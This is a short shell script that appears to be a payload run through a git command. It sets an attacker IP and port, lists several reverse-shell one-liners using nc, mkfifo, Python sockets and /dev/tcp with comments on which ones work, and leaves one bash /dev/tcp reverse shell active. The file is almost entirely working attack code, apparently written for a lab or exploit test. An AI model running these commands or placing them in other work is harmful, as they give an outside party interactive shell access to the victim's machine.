touch HelloWorld

attackerIP=192.168.180.134
attackerListenPort=1234

#work --- but stderr will not output in the attacker's shell, but do in the victim shell
#rm /tmp/backpipe ; mknod /tmp/backpipe p
#/bin/sh 0</tmp/backpipe | nc $attackerIP $attackerListenPort 1>/tmp/backpipe &

#work --- but can not use the victim shell any more which executed the git command.
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerIP $attackerListenPort >/tmp/f&

#work --- but will block the execution of the left commands in victim shell.
#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.180.134",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#exec 5<>/dev/tcp/$attackerIP/$attackerListenPort
#cat <&5 | while read line; do $line 2>&5 >&5; done
bash -i >& /dev/tcp/192.168.180.134/1234 0>&1

#don't work --- nc: invalid option -- 'e'
#nc $attackerIP $attackerListenPort -e "/bin/sh"&

#don't work --- nc: getaddrinfo: Servname not supported for ai_socktype
#rm -f /tmp/p; mknod /tmp/p p && nc $attackerIP $attackerListenPort 0/tmp/p
